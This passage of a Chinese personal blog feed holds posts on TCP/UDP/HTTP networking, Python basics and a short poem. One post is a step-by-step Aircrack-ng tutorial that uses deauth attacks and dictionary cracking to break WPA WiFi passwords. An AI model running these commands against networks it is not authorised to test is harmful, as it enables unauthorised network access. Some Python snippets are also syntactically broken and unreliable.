Number加1；主机1进入FIN_WAIT_2状态；主机2告诉主机1，我“同意”你的关闭请求；</li><li>第三次挥手：主机2向主机1发送FIN报文段，请求关闭连接，同时主机2进入LAST_ACK状态；</li><li>第四次挥手：主机1收到主机2发送的FIN报文段，向主机2发送ACK报文段，然后主机1进入TIME_WAIT状态；主机2收到主机1的ACK报文段以后，就关闭连接；此时，主机1等待2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，主机1也可以关闭连接了。</li></ol><p><strong>TCP连接建立过程：</strong>首先Client端发送连接请求报文，Server段接受连接后回复ACK报文，并为这次连接分配资源。Client端接收到ACK报文后也向Server段发生ACK报文，并分配资源，这样TCP连接就建立了。<br><strong>TCP连接断开过程：</strong>假设Client端发起中断连接请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说”我Client端没有数据要发给你了”，但是如果你还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，”告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息”。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，”告诉Client端，好了，我这边数据发完了，准备好关闭连接了”。Client端收到FIN报文后，”就知道可以关闭连接了，但是他还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。“，Server端收到ACK后，”就知道可以断开连接了”。Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，我Client端也可以关闭连接了。Ok，TCP连接就这样关闭了！</p><p><strong>为什么要三次挥手？</strong><br>   在只有两次“握手”的情形下，假设Client想跟Server建立连接，但是却因为中途连接请求的数据报丢失了，故Client端不得不重新发送一遍；这个时候Server端仅收到一个连接请求，因此可以正常的建立连接。但是，有时候Client端重新发送请求不是因为数据报丢失了，而是有可能数据传输过程因为网络并发量很大在某结点被阻塞了，这种情形下Server端将先后收到2次请求，并持续等待两个Client请求向他发送数据…问题就在这里，Cient端实际上只有一次请求，而Server端却有2个响应，极端的情况可能由于Client端多次重新发送请求数据而导致Server端最后建立了N多个响应在等待，因而造成极大的资源浪费！所以，“三次握手”很有必要！<br><strong>为什么要四次挥手？</strong><br>　　试想一下，假如现在你是客户端你想断开跟Server的所有连接该怎么做？第一步，你自己先停止向Server端发送数据，并等待Server的回复。但事情还没有完，虽然你自身不往Server发送数据了，但是因为你们之前已经建立好平等的连接了，所以此时他也有主动权向你发送数据；故Server端还得终止主动向你发送数据，并等待你的确认。其实，说白了就是保证双方的一个合约的完整执行！</p><p>使用TCP的协议：<strong>FTP（文件传输协议）、Telnet（远程登录协议）、SMTP（简单邮件传输协议）、POP3（和SMTP相对，用于接收邮件）、HTTP协议等。</strong></p><h2 id="UDP协议"><a href="#UDP协议" class="headerlink" title="UDP协议"></a>UDP协议</h2><p><strong>UDP用户数据报协议，是面向无连接的通讯协议，UDP数据包括目的端口号和源端口号信息，由于通讯不需要连接，所以可以实现广播发送。UDP通讯时不需要接收方确认，属于不可靠的传输，可能会出现丢包现象，实际应用中要求程序员编程验证。</strong></p><p>UDP与TCP位于同一层，但它不管数据包的顺序、错误或重发。因此，UDP不被应用于那些使用虚电路的面向连接的服务，UDP主要用于那些面向查询—应答的服务，例如NFS。相对于FTP或Telnet，这些服务需要交换的信息量较小。</p><p>每个UDP报文分UDP报头和UDP数据区两部分。报头由四个16位长（2字节）字段组成，分别说明该报文的源端口、目的端口、报文长度以及校验值。UDP报头由4个域组成，其中每个域各占用2个字节，具体如下：<br>　　1. 源端口号；<br>　　2. 目标端口号；<br>　　3. 数据报长度；<br>　　4. 校验值。<br>使用UDP协议包括：<strong>TFTP（简单文件传输协议）、SNMP（简单网络管理协议）、DNS（域名解析协议）、NFS、BOOTP。</strong></p><p>TCP 与 UDP 的区别：TCP是面向连接的，可靠的字节流服务；UDP是面向无连接的，不可靠的数据报服务。</p><h2 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h2><p>DNS是域名系统(DomainNameSystem)的缩写，该系统用于命名组织到域层次结构中的计算机和网络服务，可以简单地理解为<strong>将URL转换为IP地址</strong>。域名是由圆点分开一串单词或缩写组成的，每一个域名都对应一个惟一的IP地址，在Internet上域名与IP地址之间是一一对应的，DNS就是进行域名解析的服务器。DNS命名用于Internet等TCP&#x2F;IP网络中，通过用户友好的名称查找计算机和服务。</p><h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><p>超文本传输协议（HTTP，HyperText Transfer Protocol)是互联网上应用最为广泛的一种网络协议。所有的WWW文件都必须遵守这个标准。</p><p>下面是一些最常见的请HTTP请求头概述 （HttpServletRequest）：</p><ul><li>Accept：浏览器可接受的MIME类型。</li><li>Accept-Charset：浏览器可接受的字符集。</li><li>Accept-Encoding：浏览器能够进行解码的数据编码方式，比如gzip。Servlet能够向支持gzip的浏览器返回经gzip编码的HTML页面。许多情形下这可以减少5到10倍的下载时间。</li><li>Accept-Language：浏览器所希望的语言种类，当服务器能够提供一种以上的语言版本时要用到。</li><li>Authorization：授权信息，通常出现在对服务器发送的WWW-Authenticate头的应答中。</li><li>Connection：表示是否需要持久连接。如果Servlet看到这里的值为“Keep-Alive”，或者看到请求使用的是HTTP 1.1（HTTP 1.1默认进行持久连接），它就可以利用持久连接的优点，当页面包含多个元素时（例如Applet，图片），显著地减少下载所需要的时间。要实现这一点，Servlet需要在应答中发送一个Content-Length头，最简单的实现方法是：先把内容写入ByteArrayOutputStream，然后在正式写出内容之前计算它的大小。<br>Content-Length：表示请求消息正文的长度。</li><li>Cookie：这是最重要的请求头信息之一</li><li>From：请求发送者的email地址，由一些特殊的Web客户程序使用，浏览器不会用到它。</li><li>Host：初始URL中的主机和端口。</li><li>If-Modified-Since：只有当所请求的内容在指定的日期之后又经过修改才返回它，否则返回304“Not Modified”应答。</li><li>Pragma：指定“no-cache”值表示服务器必须返回一个刷新后的文档，即使它是代理服务器而且已经有了页面的本地拷贝。</li><li>Referer：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面。</li><li>User-Agent：浏览器类型，如果Servlet返回的内容与浏览器类型有关则该值非常有用。<br>UA-Pixels，UA-Color，UA-OS，UA-CPU：由某些版本的IE浏览器所发送的非标准的请求头，表示屏幕大小、颜色深度、操作系统和CPU类型。</li></ul><p>HTTP应答头概述（HttpServletResponse）：</p><p>Web服务器的HTTP应答一般由以下几项构成：一个状态行，一个或多个应答头，一个空行，内容文档。设置HTTP应答头往往和设置状态行中的状态代码结合起来。例如，有好几个表示“文档位置已经改变”的状态代码都伴随着一个Location头，而401（Unauthorized）状态代码则必须伴随一个WWW-Authenticate头。<br>然而，即使在没有设置特殊含义的状态代码时，指定应答头也是很有用的。应答头可以用来完成：设置Cookie，指定修改日期，指示浏览器按照指定的间隔刷新页面，声明文档的长度以便利用持久HTTP连接，……等等许多其他任务。<br>设置应答头最常用的方法是HttpServletResponse的setHeader，该方法有两个参数，分别表示应答头的名字和值。和设置状态代码相似，设置应答头应该在发送任何文档内容之前进行。<br>setDateHeader方法和setIntHeadr方法专门用来设置包含日期和整数值的应答头，前者避免了把Java时间转换为GMT时间字符串的麻烦，后者则避免了把整数转换为字符串的麻烦。<br>HttpServletResponse还提供了许多设置<br>setContentType：设置Content-Type头。大多数Servlet都要用到这个方法。<br>setContentLength：设置Content-Length头。对于支持持久HTTP连接的浏览器来说，这个函数是很有用的。<br>addCookie：设置一个Cookie（Servlet API中没有setCookie方法，因为应答往往包含多个Set-Cookie头）。<br>另外，如上节介绍，sendRedirect方法设置状态代码302时也会设置Location头。</p><p>HTTP应答头说明：</p><ul><li>Allow 服务器支持哪些请求方法（如GET、POST等）。</li><li>Content-Encoding 文档的编码（Encode）方法。只有在解码之后才可以得到Content-Type头指定的内容类型。利用gzip压缩文档能够显著地减少HTML文档的下载时间。Java的GZIPOutputStream可以很方便地进行gzip压缩，但只有Unix上的Netscape和Windows上的IE 4、IE 5才支持它。因此，Servlet应该通过查看Accept-Encoding头（即request.getHeader(“Accept-Encoding”)）检查浏览器是否支持gzip，为支持gzip的浏览器返回经gzip压缩的HTML页面，为其他浏览器返回普通页面。</li><li>Content-Length 表示内容长度。只有当浏览器使用持久HTTP连接时才需要这个数据。如果你想要利用持久连接的优势，可以把输出文档写入ByteArrayOutputStram，完成后查看其大小，然后把该值放入Content-Length头，最后通过byteArrayStream.writeTo(response.getOutputStream()发送内容。</li><li>Content-Type 表示后面的文档属于什么MIME类型。Servlet默认为text&#x2F;plain，但通常需要显式地指定为text&#x2F;html。由于经常要设置Content-Type，因此HttpServletResponse提供了一个专用的方法setContentType。<br>Date 当前的GMT时间。你可以用setDateHeader来设置这个头以避免转换时间格式的麻烦。</li><li>Expires 应该在什么时候认为文档已经过期，从而不再缓存它？</li><li>Last-Modified 文档的最后改动时间。客户可以通过If-Modified-Since请求头提供一个日期，该请求将被视为一个条件GET，只有改动时间迟于指定时间的文档才会返回，否则返回一个304（Not Modified）状态。Last-Modified也可用setDateHeader方法来设置。</li><li>Location 表示客户应当到哪里去提取文档。Location通常不是直接设置的，而是通过HttpServletResponse的sendRedirect方法，该方法同时设置状态代码为302。</li><li>Refresh 表示浏览器应该在多少时间之后刷新文档，以秒计。除了刷新当前文档之外，你还可以通过setHeader<br><code>(&quot;Refresh&quot;, &quot;5; URL=http://host/path&quot;)让浏览器读取指定的页面。注意这种功能通常是通过设置HTML页面HEAD区的&lt;META HTTP-EQUIV=&quot;Refresh&quot; CONTENT=&quot;5;URL=http://host/path&quot;&gt;</code>实现，这是因为，自动刷新或重定向对于那些不能使用CGI或Servlet的HTML编写者十分重要。但是，对于Servlet来说，直接设置Refresh头更加方便。注意Refresh的意义是“N秒之后刷新本页面或访问指定页面”，而不是“每隔N秒刷新本页面或访问指定页面”。因此，连续刷新要求每次都发送一个Refresh头，而发送204状态代码则可以阻止浏览器继续刷新，不管是使用Refresh头还是&lt;META HTTP-EQUIV&#x3D;”Refresh” …&gt;。注意Refresh头不属于HTTP 1.1正式规范的一部分，而是一个扩展，但Netscape和IE都支持它。</li><li>Server 服务器名字。Servlet一般不设置这个值，而是由Web服务器自己设置。</li><li>Set-Cookie 设置和页面关联的Cookie。Servlet不应使用response.setHeader(“Set-Cookie”, …)，而是应使用HttpServletResponse提供的专用方法addCookie。</li></ul><div style="position:absolute; bottom:0px; left:610px; width:76%;"><br>    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="300" height="86" src="//music.163.com/outchain/player?type=2&id=406232&auto=1&height=66"></iframe><br></div>]]></content>
    
    
    
    <tags>
      
      <tag>计算机网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用Aircrack-ng进行WiFi密码破解</title>
    <link href="/blog/2018/08/23/%E4%BD%BF%E7%94%A8Aircrack-ng%E8%BF%9B%E8%A1%8CWiFi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    <url>/blog/2018/08/23/%E4%BD%BF%E7%94%A8Aircrack-ng%E8%BF%9B%E8%A1%8CWiFi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p><strong>今天来学习一下如何抓包破解WPA加密的WiFi。</strong></p><p><img src="/images/kali.jpg"></p><span id="more"></span><h2 id="Aircrack-ng"><a href="#Aircrack-ng" class="headerlink" title="Aircrack-ng"></a>Aircrack-ng</h2><p>Aircrack-ng是一个与802.11标准的无线网络分析有关的安全软件，主要功能有：网络侦测，数据包嗅探，WEP和WPA&#x2F;WPA2-PSK破解。Aircrack-ng可以工作在任何支持监听模式的无线网卡上（设备列表请参阅其官方网站）并嗅探802.11a，802.11b，802.11g的数据。</p><p>具体详情见百度<a href="https://baike.baidu.com/item/aircrack-ng/7661805" title="aircrack-ng">https://baike.baidu.com/item/aircrack-ng/7661805</a></p><h2 id="破解准备"><a href="#破解准备" class="headerlink" title="破解准备"></a>破解准备</h2><p>首先你需要一块无线网卡，kali虚拟机（为了方便直接使用，里面的小工具很多，不用再去自己下载了）</p><h3 id="1-查看你的网卡信息"><a href="#1-查看你的网卡信息" class="headerlink" title="1.查看你的网卡信息"></a>1.查看你的网卡信息</h3><p>在kali Linux下使用命令查看网卡信息。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ifconfig</span><br></code></pre></td></tr></table></figure><p>效果图如下：<br><img src="/images/aircrack-ng.png"></p><p>可以看到里面有个wlan0，那就是我的网卡，如果没有的话就把无线网卡拔了再插一下，直到找到那个wlan0为止。一定要保证它<strong>现在没有连接到任何wifi</strong>，上面那个wlan0里面<strong>没有ip地址</strong>什么的就说明现在不在连接中。</p><h3 id="2-激活无线网卡至monitor即监听模式"><a href="#2-激活无线网卡至monitor即监听模式" class="headerlink" title="2.激活无线网卡至monitor即监听模式"></a>2.激活无线网卡至monitor即监听模式</h3><p>使用命令：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">airmon-ng <span class="hljs-literal">start</span> wlan0<br></code></pre></td></tr></table></figure><p>然后会出现以下提示信息：<br><img src="/images/aircrack-ng1.png"></p><p>如果再次使用ifconfig可以发现，我们的网卡已经被重命名为wlan0mon</p><p><strong>获取当前网络概况：</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">airodump-ng wlan0mon<br></code></pre></td></tr></table></figure><p>其中wlan0mon是已经激活监听状态的网卡。</p><h3 id="3-探测无线网络，抓取无线数据包"><a href="#3-探测无线网络，抓取无线数据包" class="headerlink" title="3.探测无线网络，抓取无线数据包"></a>3.探测无线网络，抓取无线数据包</h3><p>具体命令如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">airodump</span>-ng -c <span class="hljs-number">11</span> -w longas wlan0mon<br></code></pre></td></tr></table></figure><p>参数解释：</p><ul><li>-c设置目标AP的工作频道</li><li>-w后面紧跟要保存的文件的文件名，注意：生成的文件名是longas-01.cap</li><li>wlan0mon：为之前已经开启监听的网卡名</li></ul><p>按Enter开始执行，不要关闭并打开另一个shell进行下一步</p><h3 id="4-进行deauth攻击加速破解过程"><a href="#4-进行deauth攻击加速破解过程" class="headerlink" title="4.进行deauth攻击加速破解过程"></a>4.进行deauth攻击加速破解过程</h3><p>输入命令：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">aireplay-ng -0 9 -a <span class="hljs-keyword">AP</span>的<span class="hljs-keyword">MAC</span> -c 客户端的<span class="hljs-keyword">mac</span> wlan0mon<br></code></pre></td></tr></table></figure><p>参数解释：</p><ul><li>-0：采用Deauth攻击模式，后面紧跟攻击次数，这里设置为9，大家可以根据实际情况设置</li><li>-a：后面跟AP的mac地址</li><li>-c：后面跟客户端的mac地址</li></ul><p>按Enter键后会出现以下信息：<br><img src="/images/aircrack-ng2.png"></p><p>然后回到抓取数据包的界面。在右上角出现handshake的提示证明获得了包含WPA-PSK密码的4次握手数据报文。如未出现，在此执行上述步骤。</p><p><img src="/images/aircrack-ng3.png"></p><h2 id="开始破解WPA-PSK"><a href="#开始破解WPA-PSK" class="headerlink" title="开始破解WPA-PSK"></a>开始破解WPA-PSK</h2><p>提前用字典生成器生成所需字典。</p><p>输入以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aircrack-ng -w dict.txt 捕获的.<span class="hljs-built_in">cap</span>文件<br></code></pre></td></tr></table></figure><p>按Enter执行后，经过一段时间便可破解，这取决于密码的强度。（为了方便演示，我故意将密码写在字典里）</p><p><img src="/images/aircrack-ng4.png"></p><p>Key Found！便是破解成功。</p><div style="position:absolute; bottom:0px; left:610px; width:76%;"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=300 height=86 src="//music.163.com/outchain/player?type=2&id=38592976&auto=1&height=66"></iframe></div>]]></content>
    
    
    
    <tags>
      
      <tag>无线渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python文件和数据格式化</title>
    <link href="/blog/2018/08/22/Python%E6%96%87%E4%BB%B6%E5%92%8C%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E5%8C%96/"/>
    <url>/blog/2018/08/22/Python%E6%96%87%E4%BB%B6%E5%92%8C%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p><strong>今天对Python基础语法进行最后一部分Python文件和数据格式化的学习，到此Python基础语法基本结束。</strong></p><p><img src="/images/fj9.jpg"></p><span id="more"></span><h2 id="文件的使用"><a href="#文件的使用" class="headerlink" title="文件的使用"></a>文件的使用</h2><h3 id="文件的类型"><a href="#文件的类型" class="headerlink" title="文件的类型"></a>文件的类型</h3><p><strong>文件是数据的抽象集合</strong></p><ul><li>文件是存储在辅助存储器上的数据序列</li><li>文件是数据存储的一种形式</li><li>文件展现形态：文本文件和二进制文件</li></ul><h3 id="文件的打开和关闭"><a href="#文件的打开和关闭" class="headerlink" title="文件的打开和关闭"></a>文件的打开和关闭</h3><p>&lt;变量名&gt; &#x3D; open(&lt;文件名&gt;,&lt;打开模式&gt;)<br>文件路径要注明，源文件同目录可省略</p><p><strong>打开模式：</strong><br><img src="/images/wenjian.png"></p><p><strong>文件关闭：</strong><br>&lt;变量名&gt;.close()</p><h3 id="文件内容的读取"><a href="#文件内容的读取" class="headerlink" title="文件内容的读取"></a>文件内容的读取</h3><table><thead><tr><th>操作方法</th><th>描述</th></tr></thead><tbody><tr><td>f.read(size&#x3D;-1)</td><td>读入全部内容，如果给出参数，读入该行前size长度</td></tr><tr><td>f.readline(size&#x3D;-1)</td><td>读入一行内容，如果给出参数，读入该行前size长度</td></tr><tr><td>f.readlines(hint&#x3D;-1)</td><td>读入文件所有行，以每行为元素形成列表，如果给出参数，读入前hint行</td></tr></tbody></table><p>遍历全文本：</p><ol><li><p>一次读入统一处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Python">fname = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要打开的文件名称：&quot;</span>)<br>fo = <span class="hljs-built_in">open</span>(fname,<span class="hljs-string">&quot;r&quot;</span>)<br>txt = fo.read()<br>fo.close()<br></code></pre></td></tr></table></figure></li><li><p>按数量读入逐步处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Python">fname = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要打开的文件名称：&quot;</span>)<br>fo = <span class="hljs-built_in">open</span>(fname,<span class="hljs-string">&quot;r&quot;</span>)<br>txt = fo.read(<span class="hljs-number">2</span>)<br><span class="hljs-keyword">while</span> txt != <span class="hljs-string">&quot; &quot;</span><br>txt = fo.read(<span class="hljs-number">2</span>)<br>fo.close()<br></code></pre></td></tr></table></figure></li><li><p>文件逐行遍历(一次读入分行处理)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Python">fname = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要打开的文件名称：&quot;</span>)<br>fo = <span class="hljs-built_in">open</span>(fname,<span class="hljs-string">&quot;r&quot;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> fo.readlines():<br><span class="hljs-built_in">print</span>(line)<br>fo.close()<br></code></pre></td></tr></table></figure></li><li><p>文件逐行遍历(分行读入)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Python">fname = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要打开的文件名称：&quot;</span>)<br>fo = <span class="hljs-built_in">open</span>(fname,<span class="hljs-string">&quot;r&quot;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> fo:<br><span class="hljs-built_in">print</span>(line)<br>fo.close()<br></code></pre></td></tr></table></figure></li></ol><h3 id="数据的文件写入"><a href="#数据的文件写入" class="headerlink" title="数据的文件写入"></a>数据的文件写入</h3><table><thead><tr><th>操作方法</th><th>描述</th></tr></thead><tbody><tr><td>f.write(s)</td><td>向文件写入一个字符串或字节流</td></tr><tr><td>f.writelines(lines)</td><td>将一个元素全为字符串的列表写入文件</td></tr><tr><td>f.seek(offset)</td><td>改变当前文件操作指针位置，offset含义如下：0-文件开头；1-当前位置；2-文件结尾；</td></tr></tbody></table>]]></content>
    
    
    
    <tags>
      
      <tag>python学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Encounter</title>
    <link href="/blog/2018/08/19/Encounter/"/>
    <url>/blog/2018/08/19/Encounter/</url>
    
    <content type="html"><![CDATA[<p>If we can only encounter each other</p><p>   rather than stay with each other,</p><p>then I wish we had never encountered.</p><p><img src="/images/encounter.jpg"></p>]]></content>
    
    
    
    <tags>
      
      <tag>随笔</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python组合数据类型（二）</title>
    <link href="/blog/2018/08/19/Python%E7%BB%84%E5%90%88%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/blog/2018/08/19/Python%E7%BB%84%E5%90%88%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p><strong>今天继续学习一下Python组合数据类型。</strong><br><img src="/images/fj8.jpg"></p><span id="more"></span><h2 id="字典类型及操作"><a href="#字典类型及操作" class="headerlink" title="字典类型及操作"></a>字典类型及操作</h2><h2 id="字典类型定义"><a href="#字典类型定义" class="headerlink" title="字典类型定义"></a>字典类型定义</h2><p>映射：<strong>是一种键（索引）和值（数据）的对应</strong></p><h2 id="字典的建立"><a href="#字典的建立" class="headerlink" title="字典的建立"></a>字典的建立</h2><ul><li>赋值创建字典<br>  d&#x3D;{“key1”:”value1”,”key2”:”value2”}</li><li>工厂函数<br>  d&#x3D;dict(user1&#x3D;”123”,user2&#x3D;”234”,user3&#x3D;”345”)</li><li>内建方法:fromkeys<br>  d&#x3D;{}.fromkeys((‘username’,’password’),())</li><li>字典中的key有相同的value值,默认为None</li></ul><h3 id="基本字典操作方法"><a href="#基本字典操作方法" class="headerlink" title="基本字典操作方法"></a>基本字典操作方法</h3><ul><li>len(d)返回d中的键-值对的数量</li><li>d[k]返回关联到k上的值</li><li>d[k]&#x3D;v将值v关联到键k上</li><li>del d[k]删除键为k的项</li><li>k in d检查d中是否含有键为k项</li></ul><h3 id="字典方法"><a href="#字典方法" class="headerlink" title="字典方法"></a>字典方法</h3><p><strong>详见python基础教程P59.</strong></p><h2 id="jieba库的使用"><a href="#jieba库的使用" class="headerlink" title="jieba库的使用"></a>jieba库的使用</h2><h3 id="jieba库的基本介绍"><a href="#jieba库的基本介绍" class="headerlink" title="jieba库的基本介绍"></a>jieba库的基本介绍</h3><p>概述：jieba库是优秀的中文分词第三方库</p><ul><li>中文文本需要通过分词获得单个的词语</li><li>jieba是优秀的中文分词第三方库，需要额外安装</li><li>jieba库提供三种分词模式，最简单的只需掌握一个函数</li></ul><h3 id="jieba库的使用-1"><a href="#jieba库的使用-1" class="headerlink" title="jieba库的使用"></a>jieba库的使用</h3><ul><li>精确模式：把文本精确的分开，不存在冗余单词</li><li>全模式：把文本所有可能词语都扫描出来，有冗余</li><li>搜索引擎模式：在精确模式基础上，对长词再次切分</li></ul><p><img src="/images/jieba.png"></p><p><img src="/images/jieba1.png"></p><h2 id="实例：文本词频统计"><a href="#实例：文本词频统计" class="headerlink" title="实例：文本词频统计"></a>实例：文本词频统计</h2><h3 id="英文文本词频统计"><a href="#英文文本词频统计" class="headerlink" title="英文文本词频统计"></a>英文文本词频统计</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">getTxt</span>():<br>txt = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;hamlet.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>).read()<br>txt = txt.lower()<br><span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;~!@#$%^&amp;*()_+&#123;&#125;[]|\:;&quot;&lt;&gt;,.?/-=`&#x27;</span><br>txt = txt.replace(ch,<span class="hljs-string">&quot; &quot;</span>)<br><span class="hljs-keyword">return</span> txt<br><br>hamletTxt = getTxt()<br>words = hamletTxt.split()<br>counts = &#123;&#125;<br><span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> words:<br>counts[word] = counts.get(word,<span class="hljs-number">0</span>)+<span class="hljs-number">1</span><br><br>items = <span class="hljs-built_in">list</span>(counts.items())<br>items.sort(key=<span class="hljs-keyword">lambda</span> x:x[<span class="hljs-number">1</span>], reverse=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)<br>word,count = items[i]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;0:&lt;10&#125;&#123;1:&gt;5&#125;&quot;</span>.<span class="hljs-built_in">format</span>(word,count))<br></code></pre></td></tr></table></figure><h3 id="中文文本词频统计"><a href="#中文文本词频统计" class="headerlink" title="中文文本词频统计"></a>中文文本词频统计</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> jieba<br>txt = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;threekingdoms.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br>words = jieba.lcut(txt)<br>counts = &#123;&#125;<br><span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> words:<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(word) == <span class="hljs-number">1</span>:<br><span class="hljs-keyword">continue</span><br><span class="hljs-keyword">else</span>:<br>counts[word] = counts.get(word,<span class="hljs-number">0</span>)+<span class="hljs-number">1</span><br><br>items = <span class="hljs-built_in">list</span>(counts.items())<br>items.sort(key=<span class="hljs-keyword">lambda</span> x:x[<span class="hljs-number">1</span>], reverse=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)<br>word,count = items[i]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;0:&lt;10&#125;&#123;1:&gt;5&#125;&quot;</span>.<span class="hljs-built_in">format</span>(word,count))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>python学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python组合数据类型</title>
    <link href="/blog/2018/08/16/Python%E7%BB%84%E5%90%88%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
    <url>/blog/2018/08/16/Python%E7%BB%84%E5%90%88%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<p><strong>今天学习一下Python组合数据类型。</strong><br><img src="/images/fj7.jpg"></p><span id="more"></span><h2 id="集合类型及操作"><a href="#集合类型及操作" class="headerlink" title="集合类型及操作"></a>集合类型及操作</h2><h3 id="集合的定义"><a href="#集合的定义" class="headerlink" title="集合的定义"></a>集合的定义</h3><p><strong>集合是多个元素的无序组合</strong></p><ul><li>集合类型与数学中的集合概念一致</li><li>集合元素之间无序，每一个元素唯一，不存在相同元素</li><li>放入集合中的元素为不可变数据类型</li><li>集合用{}表示，元素 间用逗号分隔</li><li>建立集合类型用{}或者set()</li><li>建立空的集合必须用set()</li></ul><h3 id="集合操作符"><a href="#集合操作符" class="headerlink" title="集合操作符"></a>集合操作符</h3><p>6个基本操作符：</p><p><img src="/images/caozuofu.png"></p><p>关系操作符：判断子集包含关系</p><p>四个增强操作符：</p><p><img src="/images/caozuofu1.png"></p><h3 id="集合处理方法"><a href="#集合处理方法" class="headerlink" 